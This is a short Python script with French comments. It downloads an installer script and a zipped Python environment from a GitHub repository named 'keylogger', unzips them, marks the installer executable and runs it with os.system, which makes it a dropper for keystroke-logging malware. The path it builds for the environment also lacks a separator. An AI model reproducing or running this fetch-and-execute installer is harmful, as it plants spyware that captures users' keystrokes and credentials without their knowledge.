import os
import requests


urlInstalleur = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run/install_and_run.sh'

filenameInstalleur = 'install_and_run.sh'

responseInstalleur = requests.get(urlInstalleur)

if responseInstalleur.status_code == 200:
    # Sauvegarder le fichier localement
    with open(filenameInstalleur, 'w', encoding='utf-8') as file:
        file.write(responseInstalleur.text)

    print(f'Le fichier {filenameInstalleur} a été téléchargé avec succès.')

urlEnvironnement = 'https://github.com/ELREBEU/keylogger/raw/refs/heads/main/env.zip'

filenameEnvironnement = 'env.zip'

responseEnvironnement = requests.get(urlEnvironnement)

if responseEnvironnement.status_code == 200:
    with open('env.zip','wb') as f:
        f.write(responseEnvironnement.content)

os.system('unzip ' + filenameEnvironnement)
cheminToDirectory = os.getcwd()
cheminToEnvironnement = cheminToDirectory+'env/bin/python'
os.system('chmod +x ' + filenameInstalleur)
os.system('./' + filenameInstalleur + ' ' + cheminToEnvironnement)

